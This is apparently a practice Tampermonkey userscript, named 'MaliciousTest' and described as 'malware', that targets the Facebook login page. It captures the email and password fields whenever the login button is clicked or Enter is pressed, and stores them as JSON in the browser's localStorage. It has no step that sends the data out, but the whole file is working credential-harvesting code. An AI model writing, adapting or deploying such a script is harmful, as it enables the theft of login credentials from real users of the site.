// ==UserScript==
// @name         MaliciousTest
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  malware
// @author       You
// @match        https://www.facebook.com/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...

    function getCreds() {
        let user = document.getElementById("email").value;
        let cred = document.getElementById("pass").value;
        let data = {"user": user, "cred": cred};
        return data;
    }

    function send() {
        let data = getCreds();
        window.localStorage.setItem("credentials", JSON.stringify(data));
    }

    const button = document.getElementById("loginbutton");
    button.onclick = function(event) {
        send();
    }

    document.addEventListener("keydown", function(e) {
        var keycode = e.keyCode;
        if(keycode == 13) {
            send();
        }
    });
})();
